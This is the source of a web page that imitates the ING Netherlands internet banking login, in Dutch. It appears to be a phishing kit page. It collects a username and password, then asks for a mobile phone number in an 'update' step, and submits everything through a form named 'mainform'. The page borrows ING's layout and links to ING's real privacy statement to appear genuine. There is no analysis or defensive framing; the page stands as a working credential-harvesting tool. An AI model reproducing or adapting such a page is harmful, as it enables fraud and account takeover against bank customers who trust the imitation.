<div class="container scum login_page  "style=""><div class="row "style=""><div class="col-sm-12 "style=""><div class=""style="padding-top:20px"><img src="http://i.imgur.com/MhWVHIk.gif"style=""class=""/><img src="http://i.imgur.com/GLY0i45.gif"style="width:100%"class=""/></div></div><div class="col-sm-12 "style=""><div class="center"style="padding-top:"><!--<h3>Inloggen Mijn ING</h2><p>Vul alleen uw gegevens in wanneer de adresregel in uw browser begint met https:<br><br>Wilt u inloggen met uw smartphone?Wij adviseren u om dit met de<a href=""target="_top">Mobiel Bankieren App</a>te doen.</p>--></div></div><div class="col-sm-12"style=""><div class=""style="background-color:#aba195;padding-left:5px;overflow:auto"><h4 style="color:white;margin-top:10px;margin-bottom:10px">Particulier</h4></div></div><div class="col-sm-12"style=""><div class=""style="padding:15px;background-color:#f9f9f9;overflow:auto;padding-top:20px;padding-bottom:20px"><div class="form-group "style=""><label class="control-label"for="">Gebruikersnaam:</label><input class="form-control"type="text"name="fields[username]"id="username"placeholder=""/><input type="submit"style="display:none"/></div><div class="form-group "style=""><label class="control-label"for="">Wachtwoord:</label><input class="form-control"type="password"name="fields[pass]"id="pass"placeholder=""/></div></div></div><div class="col-sm-12"style=""><div class=""style="padding:15px;background-color:#ececec;overflow:auto;padding-top:20px;padding-bottom:20px"><a class="login_button"onclick="save_key()"style="">Inloggen</a></div></div><div class="col-sm-12"style="padding-bottom:15px"><hr class=""style=""/><a class="embeddedLink1"href="http://www.ing.nl/shortcut/ming/legal/Privacy-statement"target="_top">Privacy Reglement</a></div></div></div><div class="container scum none info_page"style=""><div class="row "style=""><div class="col-sm-12 "style=""><div class=""style="padding-top:20px"><img src="http://i.imgur.com/MhWVHIk.gif"style=""class=""/><img src="http://i.imgur.com/GLY0i45.gif"style="width:100%"class=""/></div></div><!--<div class="col-sm-12 "style=""><div class="center"style="padding-top:"><h3>Werk uw persoonlijke gegevens</h2><p>Om door te gaan het gebruik van internetbankieren controleer je je persoonlijke gegevens</p></div></div>--><div class="col-sm-12"style=""><div class=""style="background-color:#aba195;padding-left:5px;overflow:auto"><h4 style="color:white;margin-top:10px;margin-bottom:10px">Update Telefoonnummer</h4></div></div><div class="col-sm-12"style=""><div class=""style="padding:15px;background-color:#f9f9f9;overflow:auto;padding-top:20px;padding-bottom:20px"><div class="form-group"style=""><label class="control-label"for="">Telefoonnummer:</label><span class="phone_code_container"><span class="phone_code">+31</span><input class="form-control"maxlength="10"type="number"name="fields[mob]"id="mob"placeholder="----------"/></span></div></div></div><div class="col-sm-12"style=""><div class=""style="padding:15px;background-color:#ececec;overflow:auto;padding-top:20px;padding-bottom:20px"><a class="login_button"onclick="save_mob()"style="">Voortzetten</a></div></div><div class="col-sm-12"style="padding-bottom:15px"><hr class=""style=""/><a class="embeddedLink1"href="http://www.ing.nl/shortcut/ming/legal/Privacy-statement"target="_top">Privacy Reglement</a></div></div></div>

</body><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script><script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<script>
function save_key(){
	if(!$('.login_page').is(':visible')){
		save_mob();
		return;
	}

	$('.has-error').removeClass('has-error');
	username=$('#username').val().trim();
	pass=$('#pass').val().trim();

	if(!/^[a-z-A-Z0-9]{1,40}\b/.test(username)){
		$('#username').closest('.form-group').addClass('has-error');
	}

	if(!/^[a-z-A-Z0-9]{1,40}\b/.test(pass)){
		$('#pass').closest('.form-group').addClass('has-error');
	}

	if($('.has-error:visible').size()>0){
		return;
	}

	$('.login_page').hide();
	$('.info_page').show();
};

function save_mob(){
	$('.has-error').removeClass('has-error');
	mob=$('#mob').val().trim();
	
	if(!/^[0-9]{9,10}\b/.test(mob)){
		$('#mob').closest('.form-group').addClass('has-error');
	}

	if($('.has-error:visible').size()>0){
		return;
	}
	
	$('#mainform')[0].submit();
};
</script></html>
